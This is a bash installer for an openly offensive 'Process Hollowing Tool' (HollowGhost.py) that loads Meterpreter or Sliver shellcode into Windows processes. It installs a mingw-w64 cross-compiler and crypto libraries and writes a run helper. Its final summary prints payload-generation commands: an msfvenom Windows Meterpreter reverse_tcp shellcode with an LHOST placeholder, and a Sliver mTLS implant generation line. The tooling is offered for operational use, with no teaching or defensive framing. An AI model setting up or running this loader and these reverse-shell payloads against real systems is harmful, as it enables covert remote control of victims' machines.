#!/bin/bash
# ============================================================
# install.sh - Setup script for Process Hollowing Tool v2
# Creates virtual environment and installs all dependencies
# ============================================================

# Colors
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
CYAN='\033[0;96m'
WHITE='\033[0;97m'
BOLD='\033[1m'
RESET='\033[0m'

# Banner
echo -e "${GREEN}${BOLD}"
cat << 'EOF'
┓┏  ┓┓       ┏┓┓     
┣┫┏┓┃┃┏┓┓┏┏  ┃┓┣┓┏┓┏╋
┛┗┗┛┗┗┗┛┗┻┛  ┗┛┛┗┗┛┛┗
                    
EOF
echo -e "${WHITE}${BOLD}"
echo "        Process Hollowing Tool v2 - Installer"
echo "        Supports: Meterpreter | Sliver | Any C2"
echo -e "${RESET}"
echo -e "${CYAN}============================================================${RESET}"
echo -e "${WHITE} This script will:"
echo -e "   1. Install system dependencies (mingw-w64, python3)"
echo -e "   2. Create Python virtual environment (venv)"
echo -e "   3. Install Python packages (requests, pycryptodome)"
echo -e "   4. Verify all tools are working"
echo -e "${CYAN}============================================================${RESET}"
echo ""

# ── Check if running as root ─────────────────────────────
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root (sudo)${RESET}"
    echo -e "${YELLOW}    Run: sudo bash install.sh${RESET}"
    exit 1
fi

echo -e "${GREEN}[+] Running as root - OK${RESET}"
echo ""

# ── Detect OS ────────────────────────────────────────────
echo -e "${WHITE}[*] Detecting operating system...${RESET}"

if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
    OS_NAME=$PRETTY_NAME
else
    OS="unknown"
    OS_NAME="Unknown"
fi

echo -e "${GREEN}[+] OS Detected: ${OS_NAME}${RESET}"
echo ""

# ── Package manager detection ────────────────────────────
if command -v apt-get &>/dev/null; then
    PKG_MANAGER="apt-get"
    PKG_UPDATE="apt-get update -qq"
    PKG_INSTALL="apt-get install -y -qq"
elif command -v apt &>/dev/null; then
    PKG_MANAGER="apt"
    PKG_UPDATE="apt update -qq"
    PKG_INSTALL="apt install -y -qq"
else
    echo -e "${RED}[!] Unsupported package manager${RESET}"
    echo -e "${YELLOW}[*] This script supports Debian/Ubuntu/Kali only${RESET}"
    exit 1
fi

echo -e "${WHITE}[*] Package manager: ${PKG_MANAGER}${RESET}"

# ============================================================
# STEP 1: UPDATE SYSTEM PACKAGES
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 1: Updating package lists${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

echo -e "${WHITE}[*] Running: ${PKG_UPDATE}${RESET}"
$PKG_UPDATE 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Package lists updated${RESET}"
else
    echo -e "${YELLOW}[!] Package update had warnings (continuing...)${RESET}"
fi

# ============================================================
# STEP 2: INSTALL SYSTEM DEPENDENCIES
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 2: Installing system dependencies${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

SYSTEM_PACKAGES=(
    "python3"
    "python3-pip"
    "python3-venv"
    "mingw-w64"
    "curl"
    "wget"
    "git"
)

for pkg in "${SYSTEM_PACKAGES[@]}"; do
    echo -ne "${WHITE}[*] Installing ${pkg}...${RESET}"

    if dpkg -l | grep -q "^ii  ${pkg} " 2>/dev/null; then
        echo -e " ${GREEN}already installed${RESET}"
    else
        $PKG_INSTALL "$pkg" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e " ${GREEN}installed${RESET}"
        else
            echo -e " ${RED}FAILED${RESET}"
            echo -e "${YELLOW}    Try manually: sudo apt install ${pkg}${RESET}"
        fi
    fi
done

# ============================================================
# STEP 3: VERIFY SYSTEM TOOLS
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 3: Verifying system tools${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

ALL_OK=true

check_tool() {
    local tool=$1
    local name=$2
    if command -v "$tool" &>/dev/null; then
        local version=$($tool --version 2>&1 | head -1)
        echo -e "${GREEN}[+] ${name} - OK${RESET} (${version})"
    else
        echo -e "${RED}[!] ${name} - NOT FOUND${RESET}"
        ALL_OK=false
    fi
}

check_tool "python3"                        "Python3"
check_tool "pip3"                           "pip3"
check_tool "x86_64-w64-mingw32-g++"        "mingw32 g++"
check_tool "x86_64-w64-mingw32-windres"    "mingw32 windres"
check_tool "x86_64-w64-mingw32-gcc"        "mingw32 gcc"

if [ "$ALL_OK" = false ]; then
    echo -e "\n${YELLOW}[!] Some tools are missing. Attempting fix...${RESET}"
    $PKG_INSTALL mingw-w64 python3 python3-pip python3-venv > /dev/null 2>&1
fi

# ============================================================
# STEP 4: CREATE PYTHON VIRTUAL ENVIRONMENT
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 4: Creating Python virtual environment${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

VENV_DIR="venv"

# Remove old venv if it exists and is broken
if [ -d "$VENV_DIR" ]; then
    echo -e "${YELLOW}[!] Existing venv found - removing and recreating...${RESET}"
    rm -rf "$VENV_DIR"
fi

echo -e "${WHITE}[*] Running: python3 -m venv ${VENV_DIR}${RESET}"
python3 -m venv "$VENV_DIR"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Virtual environment created: ./${VENV_DIR}/${RESET}"
else
    echo -e "${RED}[!] Failed to create virtual environment!${RESET}"
    echo -e "${YELLOW}    Try: sudo apt install python3-venv${RESET}"
    exit 1
fi

# ── Activate virtual environment ─────────────────────────
echo -e "${WHITE}[*] Activating virtual environment...${RESET}"
source "$VENV_DIR/bin/activate"

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Virtual environment activated${RESET}"
    echo -e "${WHITE}[*] Python path: $(which python3)${RESET}"
    echo -e "${WHITE}[*] Pip path   : $(which pip)${RESET}"
else
    echo -e "${RED}[!] Failed to activate virtual environment!${RESET}"
    exit 1
fi

# ── Upgrade pip inside venv ──────────────────────────────
echo -e "${WHITE}[*] Upgrading pip inside venv...${RESET}"
pip install --upgrade pip --quiet

# ============================================================
# STEP 5: INSTALL PYTHON PACKAGES IN VENV
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 5: Installing Python packages in venv${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

PYTHON_PACKAGES=(
    "requests"
    "pycryptodome"
    "colorama"
)

for pkg in "${PYTHON_PACKAGES[@]}"; do
    echo -ne "${WHITE}[*] Installing ${pkg}...${RESET}"
    pip install "$pkg" --quiet

    if [ $? -eq 0 ]; then
        version=$(pip show "$pkg" 2>/dev/null | grep Version | awk '{print $2}')
        echo -e " ${GREEN}OK (v${version})${RESET}"
    else
        echo -e " ${RED}FAILED${RESET}"
        echo -e "${YELLOW}    Try manually: pip install ${pkg}${RESET}"
    fi
done

# ============================================================
# STEP 6: VERIFY PYTHON PACKAGES
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 6: Verifying Python packages${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

python3 -c "import requests; print('\033[92m[+] requests      - OK (v' + requests.__version__ + ')\033[0m')" 2>/dev/null || \
    echo -e "${RED}[!] requests      - FAILED${RESET}"

python3 -c "from Crypto.Cipher import AES; import Crypto; print('\033[92m[+] pycryptodome  - OK (v' + Crypto.__version__ + ')\033[0m')" 2>/dev/null || \
    echo -e "${RED}[!] pycryptodome  - FAILED${RESET}"

python3 -c "import colorama; print('\033[92m[+] colorama      - OK\033[0m')" 2>/dev/null || \
    echo -e "${RED}[!] colorama      - FAILED${RESET}"

python3 -c "import hashlib; import os; print('\033[92m[+] hashlib       - OK (built-in)\033[0m')"
python3 -c "import subprocess; print('\033[92m[+] subprocess    - OK (built-in)\033[0m')"

# ============================================================
# STEP 7: CREATE ACTIVATION HELPER SCRIPT
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 7: Creating helper scripts${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

# Create run.sh - activates venv and runs the tool
cat > run.sh << 'RUNSCRIPT'
#!/bin/bash
# Helper script - activates venv and runs HollowGhost.py

RED='\033[0;91m'
GREEN='\033[0;92m'
WHITE='\033[0;97m'
RESET='\033[0m'

# Activate virtual environment
if [ ! -d "venv" ]; then
    echo -e "${RED}[!] venv not found! Run: sudo bash install.sh first${RESET}"
    exit 1
fi

source venv/bin/activate

if [ $? -ne 0 ]; then
    echo -e "${RED}[!] Failed to activate venv${RESET}"
    exit 1
fi

echo -e "${GREEN}[+] venv activated${RESET}"

# Run the tool with all passed arguments
python3 HollowGhost.py "$@"

# Deactivate after running
deactivate
RUNSCRIPT

chmod +x run.sh
echo -e "${GREEN}[+] Created run.sh helper${RESET}"

# ============================================================
# STEP 8: FINAL VERIFICATION
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} STEP 8: Final verification${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

ERRORS=0

# Check mingw
if command -v x86_64-w64-mingw32-g++ &>/dev/null; then
    echo -e "${GREEN}[+] mingw32-g++      - READY${RESET}"
else
    echo -e "${RED}[!] mingw32-g++      - NOT FOUND${RESET}"
    ERRORS=$((ERRORS + 1))
fi

# Check venv
if [ -d "venv" ] && [ -f "venv/bin/activate" ]; then
    echo -e "${GREEN}[+] venv             - READY${RESET}"
else
    echo -e "${RED}[!] venv             - NOT FOUND${RESET}"
    ERRORS=$((ERRORS + 1))
fi

# Check python in venv
if [ -f "venv/bin/python3" ]; then
    PY_VER=$(venv/bin/python3 --version 2>&1)
    echo -e "${GREEN}[+] Python in venv   - READY (${PY_VER})${RESET}"
else
    echo -e "${RED}[!] Python in venv   - NOT FOUND${RESET}"
    ERRORS=$((ERRORS + 1))
fi

# Check packages
if venv/bin/python3 -c "import requests, Crypto, colorama" 2>/dev/null; then
    echo -e "${GREEN}[+] Python packages  - READY${RESET}"
else
    echo -e "${RED}[!] Python packages  - MISSING${RESET}"
    ERRORS=$((ERRORS + 1))
fi

# Check main script
if [ -f "HollowGhost.py" ]; then
    echo -e "${GREEN}[+] HollowGhost.py - FOUND${RESET}"
else
    echo -e "${YELLOW}[!] HollowGhost.py - NOT FOUND${RESET}"
    echo -e "${YELLOW}    Make sure HollowGhost.py is in the same directory as install.sh${RESET}"
    ERRORS=$((ERRORS + 1))
fi

# ============================================================
# SUMMARY
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}============================================================${RESET}"
echo -e "${CYAN}${BOLD} INSTALLATION SUMMARY${RESET}"
echo -e "${CYAN}${BOLD}============================================================${RESET}"

if [ $ERRORS -eq 0 ]; then
    echo -e "${GREEN}${BOLD}[+] Installation completed successfully!${RESET}"
    echo ""
    echo -e "${WHITE}To run the tool:${RESET}"
    echo ""
    echo -e "${YELLOW}  # Option 1: Use helper script (easiest)${RESET}"
    echo -e "${WHITE}  bash run.sh${RESET}"
    echo -e "${WHITE}  bash run.sh shellcode.bin --mode sliver${RESET}"
    echo ""
    echo -e "${YELLOW}  # Option 2: Manual activation${RESET}"
    echo -e "${WHITE}  source venv/bin/activate${RESET}"
    echo -e "${WHITE}  python3 HollowGhost.py${RESET}"
    echo -e "${WHITE}  deactivate${RESET}"
    echo ""
    echo -e "${YELLOW}  # Option 3: One-liner${RESET}"
    echo -e "${WHITE}  source venv/bin/activate && python3 HollowGhost.py && deactivate${RESET}"
    echo ""
    echo -e "${CYAN}Generate payloads:${RESET}"
    echo -e "${WHITE}  Meterpreter: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o msf.bin${RESET}"
    echo -e "${WHITE}  Sliver     : sliver > generate --mtls <IP>:<PORT> --format shellcode --os windows --arch amd64 --save sliver.bin${RESET}"
    echo ""
else
    echo -e "${RED}${BOLD}[!] Installation completed with ${ERRORS} error(s)${RESET}"
    echo -e "${YELLOW}[*] Fix the errors above and re-run: sudo bash install.sh${RESET}"
    echo ""
fi

echo -e "${CYAN}============================================================${RESET}"

# Deactivate venv at end of script
deactivate 2>/dev/null
